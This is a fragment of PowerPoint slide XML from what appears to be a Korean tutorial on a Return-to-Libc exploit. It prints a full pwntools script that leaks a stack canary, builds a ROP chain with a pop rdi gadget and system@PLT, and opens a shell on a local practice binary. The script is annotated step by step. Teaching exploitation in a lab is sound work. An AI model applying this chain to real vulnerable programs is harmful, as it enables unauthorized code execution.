            <a:ext cx="873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ko-KR" altLang="en-US" sz="1400" spc="-150" err="1">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>가젯</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t> 주소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40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150D0-647E-3A1B-16B2-5E12690E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D037A67-929E-19A2-42E7-006A466AC971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F0C46-A7E5-0D55-FDAC-CCA4DB0954C7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57FDE-6FC8-BF47-32C9-F7AE4C59945D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0AF50-73AC-4866-101D-D9A66C683021}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="132080" y="1351058"/>
            <a:ext cx="7835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최종 코드는 다음과 같습니다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08FDF6-9EB9-C387-0159-9EDA9B92C90B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="201748" y="1788869"/>
            <a:ext cx="5473418" cy="46362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from </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="800" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>pwn</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="800" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> import *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io = process("./</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="800" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>rtl</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="800" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>")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elf = ELF("./</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="800" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>rtl</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="800" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>")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pause()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def slog(name, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="800" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>addr</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="800" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>):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    return success(" : ".join([name, hex(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="800" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>addr</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="800" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>)]))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# Leak Canary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payload1 = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="800" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>b"A</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="800" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>" * 0x48</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="800" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>io.sendline</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="800" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>(payload1)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="800" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>io.recvuntil</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="800" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>(payload1)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="800" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>io.recvn</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="800" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>(1)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canary = u64(b"\x00" + </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="800" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>io.recvn</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="800" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>(7))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slog("canary", canary)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pause()</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="800" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>binsh</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="800" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> = next(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="800" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>elf.search</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="800" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>(b"/bin/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="800" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>sh</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="800" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>\x00")) 	// </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="800" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>프로그램의 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="800" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>“/bin/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="800" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>sh</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="800" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>” </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="800" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>문자열 주소 찾아서 저장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 err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>system_plt</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="800" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="800" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>elf.plt</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="800" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>[＂system＂]  		// </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="800" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>프로그램의 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="800" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>system@PLT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주소 찾아서 저장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 err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>pop_rdi_ret</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="800" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> = 0x40116a		// pop </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="800" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>rdi</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="800" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> ; ret </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="800" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>가젯</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="800" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> 주소 찾아서 저장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slog(＂</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="800" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>binsh</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="800" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>＂, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="800" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>binsh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slog(＂</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="800" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>system_plt</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="800" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>＂, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="800" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>system_plt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slog(＂</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="800" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>pop_rdi_ret</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="800" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>＂, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="800" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>pop_rdi_ret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payload2 = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="800" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>b＂A</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="800" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>＂ * 0x48	// </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="800" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>버퍼 채우기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payload2 += p64(canary)	// + leak</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="800" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>을 통해 얻은 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="800" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>카나리</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="800" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> 값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payload2 += </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="800" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>b"B</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="800" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>" * 0x8	// </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="800" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>rbp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채우기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payload2 += p64(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="800" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>pop_rdi_ret</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="800" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>)	// pop </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="800" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>rdi</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="800" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> ; ret </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="800" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>명령 주소로 복귀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payload2 += p64(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="800" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>binsh</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="800" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>)	// pop </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="800" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>rdi</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="800" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>로 인해 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="800" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>“/bin/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="800" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>sh</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="800" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>” </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="800" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>문자열 주소 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="800" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>-&gt; </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="800" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>rdi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저장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payload2 += p64(pop_rdi_ret+1)	// </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="800" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>함수 호출 규약에 의해 함수 호출 시 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="800" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>rsp</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="800" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>를 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="800" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>0x10 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="800" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>바이트로 정렬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payload2 += p64(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="800" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>system_plt</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="800" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>)	// </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="800" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>system@PLT</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="800" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>로 복귀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 err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>io.sendline</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="800" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>(payload2)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pause()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 err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>io.interactive</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="800" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>()		// </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="800" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>쉘과 상호작용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87EFDAF-2C4D-D7CC-37FC-50579D7E1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102" y="2729395"/>
            <a:ext cx="615315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71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B1279-4446-3B96-C890-C60F0F40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6A0BF1B-1443-F33A-4E10-76AA2830CA4A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E1E3C-131F-E995-0208-E9C456800A11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C1098-443C-A224-4019-AB86A8907C53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7C82E-352C-455C-F8E9-F4EE20B076F5}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="132080" y="1406731"/>
            <a:ext cx="7835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1. main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함수의 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>RET </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>변조로 인해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가젯의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pop_rdi_ret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주소로 복귀합니다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841E062-B183-D52A-45A3-7168E7A1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657" y="2137818"/>
            <a:ext cx="89249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0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1A8E7-CDD8-87C5-145C-F2187DC4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02559D0-1531-C543-70C6-9187A7FA1AD3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F435D-556A-4A9C-AB70-326F8DAC8A56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C942E-EADC-4010-2933-BC8E630ED70E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D675A9-E2A7-4982-9C9A-F50BE27AB14D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="132080" y="1406731"/>
            <a:ext cx="7835993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2. pop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rdi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>
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>+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r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>ret</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t> 명령이 수행되면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rdi</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>에는 현재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rsp</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t> 주소의 값인 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>“/bin/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</a:rPr>
              <a:t>” </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>문자열 주소</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>(0x402004)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>가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rdi</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>에 저장됩니다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ret </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>수행 시 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>pop rip</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>를 하므로 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>gadget + 5 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>의 주소 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>ret</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>를 한번 더 수행 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이는 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>x86_64</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>에서 함수 호출 규약에 의해 함수를 호출할 때</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>(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system@PLT</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill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RSP </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>값이 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>0x10 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>바이트 단위로 정렬되어 </a:t>
            </a:r>
            <a:r>
